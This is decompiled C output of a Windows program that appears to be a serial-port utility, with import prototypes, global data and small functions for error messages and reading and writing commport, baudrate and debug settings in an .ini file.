// extern DWORD (__stdcall *WaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
// extern BOOL (__stdcall *GetOverlappedResult)(HANDLE hFile, LPOVERLAPPED lpOverlapped, LPDWORD lpNumberOfBytesTransferred, BOOL bWait);
// extern LPSTR (__stdcall *lstrcpynA)(LPSTR lpString1, LPCSTR lpString2, int iMaxLength);
// extern BOOL (__stdcall *GetVersionExA)(LPOSVERSIONINFOA lpVersionInformation);
// extern HANDLE (__stdcall *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern int (__stdcall *WideCharToMultiByte)(UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar);
// extern void (__stdcall *SetLastError)(DWORD dwErrCode);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern DWORD (__stdcall *FormatMessageA)(DWORD dwFlags, LPCVOID lpSource, DWORD dwMessageId, DWORD dwLanguageId, LPSTR lpBuffer, DWORD nSize, va_list *Arguments);
// extern PVOID (__stdcall *DecodePointer)(PVOID Ptr);
// extern PVOID (__stdcall *EncodePointer)(PVOID Ptr);
// extern LPTOP_LEVEL_EXCEPTION_FILTER (__stdcall *SetUnhandledExceptionFilter)(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter);
// extern DWORD (__stdcall *GetFileType)(HANDLE hFile);
// extern DWORD (__stdcall *GetCurrentThreadId)();
// extern BOOL (__stdcall *AlphaBlend)(HDC hdcDest, int xoriginDest, int yoriginDest, int wDest, int hDest, HDC hdcSrc, int xoriginSrc, int yoriginSrc, int wSrc, int hSrc, BLENDFUNCTION ftn);
// extern BSTR (__stdcall *SysAllocStringLen)(const OLECHAR *strIn, UINT ui);
// extern void (__stdcall *SysFreeString)(BSTR bstrString);
// extern HRESULT (__stdcall *OleLoadPicture)(LPSTREAM lpstream, LONG lSize, BOOL fRunmode, const IID *const riid, LPVOID *lplpvObj);
// extern BOOL (__stdcall *wglMakeCurrent)(HDC, HGLRC);
// extern HGLRC (__stdcall *wglCreateContext)(HDC);
// extern RPC_STATUS (__stdcall *UuidToStringA)(const UUID *Uuid, RPC_CSTR *StringUuid);
// extern RPC_STATUS (__stdcall *UuidCreate)(UUID *Uuid);
// extern BOOL (__stdcall *SetupDiEnumDeviceInterfaces)(HDEVINFO DeviceInfoSet, PSP_DEVINFO_DATA DeviceInfoData, const GUID *InterfaceClassGuid, DWORD MemberIndex, PSP_DEVICE_INTERFACE_DATA DeviceInterfaceData);
// extern BOOL (__stdcall *SetupDiGetDeviceInterfaceDetailA)(HDEVINFO DeviceInfoSet, PSP_DEVICE_INTERFACE_DATA DeviceInterfaceData, PSP_DEVICE_INTERFACE_DETAIL_DATA_A DeviceInterfaceDetailData, DWORD DeviceInterfaceDetailDataSize, PDWORD RequiredSize, PSP_DEVINFO_DATA DeviceInfoData);
// extern BOOL (__stdcall *SetupDiClassGuidsFromNameA)(PCSTR ClassName, LPGUID ClassGuidList, DWORD ClassGuidListSize, PDWORD RequiredSize);
// extern HDEVINFO (__stdcall *SetupDiGetClassDevsA)(const GUID *ClassGuid, PCSTR Enumerator, HWND hwndParent, DWORD Flags);
// extern BOOL (__stdcall *SetupDiEnumDeviceInfo)(HDEVINFO DeviceInfoSet, DWORD MemberIndex, PSP_DEVINFO_DATA DeviceInfoData);
// extern HKEY (__stdcall *SetupDiOpenDevRegKey)(HDEVINFO DeviceInfoSet, PSP_DEVINFO_DATA DeviceInfoData, DWORD Scope, DWORD HwProfile, DWORD KeyType, REGSAM samDesired);
// extern BOOL (__stdcall *SetupDiGetDeviceRegistryPropertyA)(HDEVINFO DeviceInfoSet, PSP_DEVINFO_DATA DeviceInfoData, DWORD Property, PDWORD PropertyRegDataType, PBYTE PropertyBuffer, DWORD PropertyBufferSize, PDWORD RequiredSize);
// extern BOOL (__stdcall *SetupDiDestroyDeviceInfoList)(HDEVINFO DeviceInfoSet);
// extern LPWSTR *(__stdcall *CommandLineToArgvW)(LPCWSTR lpCmdLine, int *pNumArgs);
// extern BOOL (__stdcall *Shell_NotifyIconA)(DWORD dwMessage, PNOTIFYICONDATAA lpData);
// extern BOOL (__stdcall *PathFileExistsW)(LPCWSTR pszPath);
// extern HRESULT (__stdcall *SHCreateStreamOnFileA)(LPCSTR pszFile, DWORD grfMode, IStream **ppstm);
// extern BOOL (__stdcall *GetUserObjectInformationW)(HANDLE hObj, int nIndex, PVOID pvInfo, DWORD nLength, LPDWORD lpnLengthNeeded);
// extern HWND (__stdcall *SetActiveWindow)(HWND hWnd);
// extern HWINSTA (__stdcall *GetProcessWindowStation)();
// extern int (__stdcall *MessageBoxA)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);
// extern int (*wsprintfA)(LPSTR, LPCSTR, ...);
// extern BOOL (__stdcall *SetWindowPos)(HWND hWnd, HWND hWndInsertAfter, int X, int Y, int cx, int cy, UINT uFlags);
// extern BOOL (__stdcall *ShowWindow)(HWND hWnd, int nCmdShow);
// extern LRESULT (__stdcall *SendMessageA)(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
// extern LRESULT (__stdcall *DefWindowProcA)(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
// extern BOOL (__stdcall *TrackPopupMenu)(HMENU hMenu, UINT uFlags, int x, int y, int nReserved, HWND hWnd, const RECT *prcRect);
// extern int (__stdcall *ReleaseDC)(HWND hWnd, HDC hDC);
// extern HDC (__stdcall *GetDC)(HWND hWnd);
// extern BOOL (__stdcall *SetCaretBlinkTime)(UINT uMSeconds);
// extern LONG (__stdcall *GetWindowLongA)(HWND hWnd, int nIndex);
// extern HWND (__stdcall *SetCapture)(HWND hWnd);
// extern BOOL (__stdcall *PtInRect)(const RECT *lprc, POINT pt);
// extern BOOL (__stdcall *RedrawWindow)(HWND hWnd, const RECT *lprcUpdate, HRGN hrgnUpdate, UINT flags);
// extern HMENU (__stdcall *CreateMenu)();
// extern HMENU (__stdcall *LoadMenuA)(HINSTANCE hInstance, LPCSTR lpMenuName);
// extern HBITMAP (__stdcall *LoadBitmapA)(HINSTANCE hInstance, LPCSTR lpBitmapName);
// extern BOOL (__stdcall *AttachThreadInput)(DWORD idAttach, DWORD idAttachTo, BOOL fAttach);
// extern int (__stdcall *GetScrollPos)(HWND hWnd, int nBar);
// extern BOOL (__stdcall *GetScrollRange)(HWND hWnd, int nBar, LPINT lpMinPos, LPINT lpMaxPos);
// extern HWND (__stdcall *GetForegroundWindow)();
// extern LONG (__stdcall *SetWindowLongA)(HWND hWnd, int nIndex, LONG dwNewLong);
// extern BOOL (__stdcall *GetClientRect)(HWND hWnd, LPRECT lpRect);
// extern BOOL (__stdcall *CopyRect)(LPRECT lprcDst, const RECT *lprcSrc);
// extern UINT (__stdcall *GetDlgItemInt)(HWND hDlg, int nIDDlgItem, BOOL *lpTranslated, BOOL bSigned);
// extern BOOL (__stdcall *ClientToScreen)(HWND hWnd, LPPOINT lpPoint);
// extern HANDLE (__stdcall *LoadImageA)(HINSTANCE hInst, LPCSTR name, UINT type, int cx, int cy, UINT fuLoad);
// extern BOOL (__stdcall *DrawStateA)(HDC hdc, HBRUSH hbrFore, DRAWSTATEPROC qfnCallBack, LPARAM lData, WPARAM wData, int x, int y, int cx, int cy, UINT uFlags);
// extern HWND (__stdcall *CreateWindowExA)(DWORD dwExStyle, LPCSTR lpClassName, LPCSTR lpWindowName, DWORD dwStyle, int X, int Y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam);
// extern int (__stdcall *GetWindowTextA)(HWND hWnd, LPSTR lpString, int nMaxCount);
// extern HDC (__stdcall *BeginPaint)(HWND hWnd, LPPAINTSTRUCT lpPaint);
// extern int (__stdcall *DrawTextA)(HDC hdc, LPCSTR lpchText, int cchText, LPRECT lprc, UINT format);
// extern BOOL (__stdcall *EndPaint)(HWND hWnd, const PAINTSTRUCT *lpPaint);
// extern void (__stdcall *PostQuitMessage)(int nExitCode);
// extern LRESULT (__stdcall *SendDlgItemMessageA)(HWND hDlg, int nIDDlgItem, UINT Msg, WPARAM wParam, LPARAM lParam);
// extern BOOL (__stdcall *OpenClipboard)(HWND hWndNewOwner);
// extern BOOL (__stdcall *EmptyClipboard)();
// extern HANDLE (__stdcall *SetClipboardData)(UINT uFormat, HANDLE hMem);
// extern BOOL (__stdcall *CloseClipboard)();
// extern HWND (__stdcall *GetDlgItem)(HWND hDlg, int nIDDlgItem);
// extern BOOL (__stdcall *IsWindowVisible)(HWND hWnd);
// extern HMENU (__stdcall *CreatePopupMenu)();
// extern BOOL (__stdcall *AppendMenuA)(HMENU hMenu, UINT uFlags, UINT_PTR uIDNewItem, LPCSTR lpNewItem);
// extern BOOL (__stdcall *SetForegroundWindow)(HWND hWnd);
// extern BOOL (__stdcall *GetCursorPos)(LPPOINT lpPoint);
// extern HINTERNET (__stdcall *WinHttpOpen)(LPCWSTR pszAgentW, DWORD dwAccessType, LPCWSTR pszProxyW, LPCWSTR pszProxyBypassW, DWORD dwFlags);
// extern int (__stdcall *WSAStartup)(WORD wVersionRequested, LPWSADATA lpWSAData);
// extern int (__stdcall *WSACleanup)();
// extern int (__stdcall *closesocket)(SOCKET s);
// extern int (__stdcall *getsockopt)(SOCKET s, int level, int optname, char *optval, int *optlen);
// extern SOCKET (__stdcall *socket)(int af, int type, int protocol);
// extern int (__stdcall *bind)(SOCKET s, const struct sockaddr *name, int namelen);
// extern HRESULT (__stdcall *StgOpenStorage)(const WCHAR *pwcsName, IStorage *pstgPriority, DWORD grfMode, SNB snbExclude, DWORD reserved, IStorage **ppstgOpen);
// extern HRESULT (__stdcall *CreateStreamOnHGlobal)(HGLOBAL hGlobal, BOOL fDeleteOnRelease, LPSTREAM *ppstm);
// extern int (__stdcall *StringFromGUID2)(const GUID *const rguid, LPOLESTR lpsz, int cchMax);
// extern HRESULT (__stdcall *StgCreateDocfile)(const WCHAR *pwcsName, DWORD grfMode, DWORD reserved, IStorage **ppstgOpen);
int dword_4236C0[] = { 825305120 }; // weak
GUID stru_423870 = { 2262880736u, 32905u, 4560u, { 156u, 228u, 8u, 0u, 62u, 48u, 31u, 115u } }; // weak
const char byte_423880[4] = { '\0', '\0', '\0', '\0' }; // idb
void *std::bad_alloc::`vftable' = &sub_402477; // weak
__int16 word_423A88 = 0; // weak
_UNKNOWN unk_423AE4; // weak
const IID stru_423B50 = { 102048327u, 28496u, 18010u, { 146u, 69u, 17u, 139u, 253u, 59u, 96u, 7u } }; // idb
const IID riid = { 2079852928u, 48946u, 4122u, { 139u, 187u, 0u, 170u, 0u, 48u, 12u, 171u } }; // idb
void *std::exception::`vftable' = &sub_40C2E0; // weak
void *type_info::`vftable' = &sub_40C33C; // weak
void *std::bad_exception::`vftable' = &sub_4115AD; // weak
_UNKNOWN unk_42CA0C; // weak
_UNKNOWN unk_436A98; // weak
_UNKNOWN unk_436AA4; // weak
int dword_43F420[] = { 149 }; // weak
void *std::logic_error::`vftable' = &sub_42152F; // weak
void *std::length_error::`vftable' = &sub_42152F; // weak
void *std::out_of_range::`vftable' = &sub_42152F; // weak
_UNKNOWN unk_447BBC; // weak
const _ThrowInfo _TI2_AVbad_alloc_std__ = { 0u, &sub_40245D, NULL, &_CTA2_AVbad_alloc_std__ }; // idb
int dword_44A098 = 1; // weak
int dword_44A09C = 115200; // weak
int nIDDlgItem = 165; // idb
int dword_44AA1C = -1; // weak
void *off_44AA50 = &unk_454A80; // weak
int dword_44B244 = 1024; // weak
int dword_44B248 = -1023; // weak
int dword_44B24C = 53; // weak
int dword_44B250 = 11; // weak
int dword_44B254 = 64; // weak
int dword_44B258 = 1023; // weak
int dword_44B25C = 128; // weak
int dword_44B260 = -127; // weak
int dword_44B264 = 24; // weak
int dword_44B268 = 8; // weak
int dword_44B26C = 32; // weak
int dword_44B270 = 127; // weak
HANDLE hObject = (HANDLE)0xFFFFFFFE; // idb
int dword_44B538 = 336900096; // weak
_DWORD dword_44BCF0 = 335544420; // weak
_DWORD dword_44C5B8 = 16777216; // weak
_DWORD dword_44C6B8 = 4096; // weak
_DWORD dword_44C718 = 2; // weak
int dword_44C84C = 1; // weak
int dword_44C850 = 1; // weak
int dword_44C854 = 1; // weak
int (__cdecl *off_44C85C)(_DWORD, _DWORD, _DWORD) = &operator delete; // weak
int (__cdecl *off_44C860)(_DWORD, _DWORD) = &realloc; // weak
int (__cdecl *off_44C864)(_DWORD, _DWORD, _DWORD, _DWORD) = &sub_41DFC0; // weak
int (__cdecl *off_44C868)(_DWORD) = &free; // weak
int dword_44C878 = 856047616; // weak
_DWORD dword_44C8B0 = 855638116; // weak
int dword_44C8E8 = 839270400; // weak
_DWORD dword_44C918 = 838860900; // weak
int dword_44C940 = 772157440; // weak
_DWORD dword_44CBC8 = 771752035; // weak
int dword_44CE68 = 671531008; // weak
_DWORD dword_44CED0 = 671088744; // weak
int dword_44CF10 = 654721024; // weak
_DWORD dword_44CFB0 = 654311524; // weak
int dword_44D0A8 = 638271488; // weak
_DWORD dword_44D1E8 = 637534308; // weak
int dword_44D338 = 789131264; // weak
_DWORD dword_44D500 = 788529284; // weak
int dword_44D640 = 621346816; // weak
_DWORD dword_44D7D0 = 620757092; // weak
int dword_44D860 = 604397568; // weak
_DWORD dword_44D8A0 = 603979877; // weak
int dword_44D8E0 = 587730944; // weak
_DWORD dword_44D9D8 = 587202660; // weak
int dword_44DA90 = 571097088; // weak
_DWORD dword_44DCA0 = 570425462; // weak
int dword_44DEC8 = 554139648; // weak
_DWORD dword_44E010 = 553648245; // weak
int dword_44E1D0 = 537280512; // weak
_DWORD dword_44E2E8 = 536871012; // weak
int dword_44E3D8 = 269352960; // weak
_DWORD dword_44E860 = 268435571; // weak
int dword_44EA38 = 688271360; // weak
_DWORD dword_44EA60 = 687865955; // weak
int dword_44EA80 = 252108800; // weak
_DWORD dword_44EAF8 = 251658341; // weak
int dword_44EB10 = 235307008; // weak
_DWORD dword_44EBC8 = 234881134; // weak
int dword_44EC50 = 218513408; // weak
_DWORD dword_44F068 = 218103979; // weak
int dword_44F470 = 184958976; // weak
_DWORD dword_44F5E8 = 184549486; // weak
int dword_44F6F8 = 168222720; // weak
_DWORD dword_44F7D0 = 167772262; // weak
int dword_44F848 = 151515136; // weak
_DWORD dword_44F9A0 = 150995044; // weak
int dword_44FA88 = 134647808; // weak
_DWORD dword_44FAC8 = 134217828; // weak
int dword_44FAE0 = 117862400; // weak
int dword_44FB18 = 101339136; // weak
_DWORD dword_44FDB0 = 100663458; // weak
int dword_450008 = 84303872; // weak
_DWORD dword_450098 = 83886181; // weak
int dword_450110 = 67682304; // weak
_DWORD dword_450300 = 67108964; // weak
int dword_450510 = 50851840; // weak
_DWORD dword_450690 = 50331748; // weak
char *off_4507D0[44] =
{
  "No error",
  "Operation not permitted",
  "No such file or directory",
  "No such process",
  "Interrupted function call",
  "Input/output error",
  "No such device or address",
  "Arg list too long",
  "Exec format error",
  "Bad file descriptor",
  "No child processes",
  "Resource temporarily unavailable",
  "Not enough space",
  "Permission denied",
  "Bad address",
  "Unknown error",
  "Resource device",
  "File exists",
  "Improper link",
  "No such device",
  "Not a directory",
  "Is a directory",
  "Invalid argument",
  "Too many open files in system",
  "Too many open files",
  "Inappropriate I/O control operation",
  "Unknown error",
  "File too large",
  "No space left on device",
  "Invalid seek",
  "Read-only file system",
  "Too many links",
  "Broken pipe",
  "Domain error",
  "Result too large",
  "Unknown error",
  "Resource deadlock avoided",
  "Unknown error",
  "Filename too long",
  "No locks available",
  "Function not implemented",
  "Directory not empty",
  "Illegal byte sequence",
  "Unknown error"
}; // weak
_UNKNOWN unk_450880; // weak
CHAR Source[272] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // weak
char Destination[1024] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  
}; // idb
char byte_450DB0[1288]; // idb
int dword_4512B8; // weak
char byte_4512BC; // weak
char byte_4512BD; // weak
int dword_4512C0; // weak
int dword_4512C4; // weak
CHAR MultiByteStr[1032]; // idb
int dword_4516D0; // weak
char byte_4516D8[128]; // weak
int dword_451758; // weak
HANDLE hFile; // idb
int dword_451760; // weak
int dword_451764; // weak
int dword_451768; // weak
int dword_45176C; // weak
int dword_451770; // weak
int dword_451774; // weak
CHAR String[124]; // idb
char byte_4517F4; // weak
int dword_451884; // weak
WCHAR pszAgentW; // idb
__int16 word_4518E2; // weak
int dword_4518F4; // weak
__int16 word_451950; // weak
__int16 word_4519A2; // weak
__int16 word_451A5C; // weak
CHAR FileName[34]; // idb
char byte_451AB2; // weak
char byte_451AC1; // weak
int dword_451B94; // weak
int dword_451B98; // weak
int dword_451B9C; // weak
int dword_451BA0; // weak
int dword_451BA4; // weak
_UNKNOWN unk_451BA8; // weak
__int16 word_451DD4; // weak
_UNKNOWN unk_451F60; // weak
char byte_451FD2; // weak
char byte_451FEE; // weak
char byte_451FFA; // weak
int dword_452064; // weak
void *dword_452068; // idb
int dword_45206C; // weak
int dword_452070; // weak
int dword_452074; // weak
int dword_452078; // weak
int dword_45207C; // weak
int dword_452080; // weak
int dword_452084; // weak
int dword_452088; // weak
int dword_45208C; // weak
int dword_452090; // weak
int dword_452094; // weak
int dword_4521AC; // weak
_UNKNOWN unk_4521B8; // weak
char byte_4521E3; // weak
char byte_452241; // weak
char byte_4522B5; // weak
int c; // idb
UINT_PTR Y; // idb
HDC cpt; // idb
int dword_452300; // weak
HWND hWnd; // idb
int dword_452308; // weak
int dword_45230C; // weak
HANDLE dword_452310; // idb
int dword_452314; // weak
int dword_452318; // weak
int y; // idb
HDC hdc; // idb
int dword_452328; // weak
int dword_45232C; // weak
HWND hDlg; // idb
int dword_45233C; // weak
HWND dword_452340; // idb
_DWORD dword_452348[3]; // weak
PVOID Ptr; // idb
PVOID dword_4523AC; // idb
PVOID dword_453138; // idb
int dword_453144; // weak
int dword_453148; // weak
PVOID dword_45314C; // idb
PVOID dword_453150; // idb
PVOID dword_453154; // idb
PVOID dword_453158; // idb
PVOID dword_45315C; // idb
int dword_453160; // weak
_UNKNOWN unk_4531A0; // weak
char byte_4531B8[4064]; // idb
_DWORD dword_454198; // weak
_UNKNOWN unk_45419C; // weak
_UNKNOWN unk_45458C; // weak
_UNKNOWN unk_454698; // weak
int dword_454828; // weak
int dword_45482C; // weak
int dword_454830; // weak
char byte_454834; // weak
_UNKNOWN unk_454838; // weak
int (__cdecl *dword_454878)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__cdecl *dword_45487C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__cdecl *dword_454880)(_DWORD, _DWORD); // weak
int dword_45489C; // weak
int (__cdecl *dword_4548A0)(_DWORD, _DWORD, _DWORD, _DWORD); // weak
int (*dword_4548A4)(void); // weak
int (__cdecl *dword_4548AC)(_DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__cdecl *dword_4548B0)(_DWORD, _DWORD, _DWORD); // weak
_DWORD dword_4548B4[2]; // weak
unsigned __int8 byte_4548BC[8]; // weak
int dword_4548C4; // weak
int dword_4548D0; // weak
int dword_4548D8; // weak
int (*dword_4548E0)(void); // weak
LPCSTR lpModuleName; // idb
int dword_454920; // weak
int dword_454924; // weak
int dword_454940; // weak


//----- (00401000) --------------------------------------------------------
DWORD sub_401000()
{
  DWORD ModuleFileNameA; // [esp+0h] [ebp-4h]

  ModuleFileNameA = GetModuleFileNameA(0, &Source, 0x104u);
  if ( !ModuleFileNameA )
    Source = 0;
  return ModuleFileNameA;
}

//----- (0040102B) --------------------------------------------------------
int __cdecl sub_40102B(char *Str, char *Source)
{
  char *v3; // eax
  char *Destination; // [esp+0h] [ebp-4h]

  if ( !::Source[0] )
    return 2;
  strncpy(Str, ::Source, 0x104u);
  v3 = strrchr(Str, 46);
  Destination = v3;
  if ( !v3 )
    return 11;
  if ( *Source != 46 )
    Destination = v3 + 1;
  strcpy(Destination, Source);
  return 0;
}

//----- (00401091) --------------------------------------------------------
char *__cdecl sub_401091(DWORD dwMessageId)
{
  DWORD v2; // eax
  DWORD LastError; // eax
  DWORD v4; // [esp+4h] [ebp-Ch]
  CHAR Buffer[4]; // [esp+8h] [ebp-8h] BYREF

  v4 = dwMessageId;
  if ( (dwMessageId & 0x80000000) != 0 )
  {
    v4 = -dwMessageId;
    dwMessageId = -dwMessageId;
  }
  if ( dwMessageId >= 0x2AF8 && dwMessageId <= 0x2B0E )
    return (char *)dword_43F420[dwMessageId];
  if ( dwMessageId >= 0x28 && dwMessageId <= 0x30 )
    return (char *)dword_4236C0[dwMessageId];
  if ( FormatMessageA(0x1300u, 0, dwMessageId, 0x400u, Buffer, 0, 0) )
  {
    if ( *(_DWORD *)Buffer )
    {
      strncpy(Destination, *(const char **)Buffer, 0x400u);
      LocalFree(*(HLOCAL *)Buffer);
    }
    else
    {
      LastError = GetLastError();
      sprintf(Destination, "NULL buffer in response from FormatMessage() [%u]", LastError);
    }
  }
  else if ( GetLastError() == 317 )
  {
    sprintf(Destination, "FormatMessage(): no message for error code %d", v4);
  }
  else
  {
    v2 = GetLastError();
    sprintf(Destination, "FormatMessage() failed: [%u], errcode %d", v2, v4);
  }
  sub_4011AB(Destination);
  return Destination;
}
// 4236C0: using guessed type int dword_4236C0[];
// 43F420: using guessed type int dword_43F420[];

//----- (004011AB) --------------------------------------------------------
int __cdecl sub_4011AB(char *Str)
{
  int result; // eax
  size_t i; // [esp+0h] [ebp-4h]

  for ( i = strlen(Str); ; Str[i] = 0 )
  {
    result = 1;
    if ( !i )
      break;
    if ( Str[i - 1] != 10 )
    {
      result = Str[i - 1];
      if ( result != 13 )
        break;
    }
    --i;
  }
  return result;
}

//----- (004011FE) --------------------------------------------------------
DWORD sub_4011FE()
{
  return sub_401208();
}

//----- (00401208) --------------------------------------------------------
DWORD sub_401208()
{
  FILE *v0; // eax
  FILE *Stream; // [esp+4h] [ebp-4h]

  v0 = fopen(byte_450DB0, "wt");
  Stream = v0;
  if ( !v0 )
    return GetLastError();
  fprintf(v0, "commport=%u\n", dword_44A098);
  fprintf(Stream, "baudrate=%u\n", dword_44A09C);
  fprintf(Stream, "debug=%u\n", dword_451758 != 0);
  fclose(Stream);
  return 0;
}
// 44A098: using guessed type int dword_44A098;
// 44A09C: using guessed type int dword_44A09C;
// 451758: using guessed type int dword_451758;

//----- (0040128B) --------------------------------------------------------
int sub_40128B()
{
  int result; // eax
  FILE *Stream; // [esp+0h] [ebp-88h]
  char Str[6]; // [esp+8h] [ebp-80h] BYREF
  char v3[3]; // [esp+Eh] [ebp-7Ah] BYREF
  char String[119]; // [esp+11h] [ebp-77h] BYREF

  result = sub_40102B(byte_450DB0, ".ini");
  if ( !result )
  {
    Stream = fopen(byte_450DB0, "rt");
    if ( Stream )
    {
      while ( fgets(Str, 128, Stream) )
      {
        sub_4013BA(Str);
        sub_4011AB(Str);
        if ( strlen(Str) )
        {
          if ( !strncmp(Str, "commport=", 9u) )
          {
            dword_44A098 = strtoul(String, 0, 0);
          }
          else if ( !strncmp(Str, "baudrate=", 9u) )
          {
            dword_44A09C = strtoul(String, 0, 0);
          }
          else if ( !strncmp(Str, "debug=", 6u) )
          {
            dword_451758 = strtoul(v3, 0, 0);
          }
        }
      }
      return 0;
    }
    else
    {
      return 0;
    }
  }
  return result;
}
// 44A098: using guessed type int dword_44A098;
// 44A09C: using guessed type int dword_44A09C;
// 451758: using guessed type int dword_451758;
// 40128B: using guessed type char var_7A[3];

//----- (004013BA) --------------------------------------------------------
char *__cdecl sub_4013BA(char *Str)
{
  char *result; // eax

  result = strchr(Str, 35);
  if ( result )
    *result = 0;
  return result;
}

//----- (004013DB) --------------------------------------------------------
bool __cdecl sub_4013DB(unsigned int *Src, size_t Size, _BYTE *a3)
{
  int v4[28]; // [esp+0h] [ebp-70h] BYREF

  if ( !sub_41BEC0(v4) )
    return 0;
  if ( sub_41D000(v4, Src, Size) )
    return sub_41D0E0(a3, v4) != 0;
  return 0;
}

//----- (00401427) --------------------------------------------------------
void **__cdecl sub_401427(void **a1)
{
  _BYTE v2[52]; // [esp+0h] [ebp-44h] BYREF
  _BYTE *v3; // [esp+34h] [ebp-10h]
  int v4; // [esp+40h] [ebp-4h]

  v3 = v2;
  memset(&v2[40], 0, 12);
  v4 = 0;
  sub_41BE80();
  sub_401D04(a1, (char *)byte_423880);
  return a1;
}

//----- (004014AE) --------------------------------------------------------
_DWORD *__cdecl sub_4014AE(int a1)
{
  _DWORD *i; // [esp+0h] [ebp-4h]

  for ( i = (_DWORD *)dword_4512C0; i; i = (_DWORD *)*i )
  {
    if ( i[2] == a1 )
      return i + 3;
  }
  return 0;
}
// 4512C0: using guessed type int dword_4512C0;

//----- (004014E3) --------------------------------------------------------
BOOL __cdecl sub_4014E3(char *Str, int a2)
{
  BOOL v3; // [esp+0h] [ebp-Ch]
  size_t v4; // [esp+4h] [ebp-8h]
  size_t i; // [esp+8h] [ebp-4h]

  v4 = strlen(Str);
  v3 = 1;
  if ( !v4 )
    return 0;
  for ( i = 0; i < v4 && v3; ++i )
  {
    v3 = _ismbcdigit(Str[i]) != 0;
    if ( a2 )
    {
      if ( Str[i] == 58 )
        v3 = 1;
    }
  }
  return v3;
}

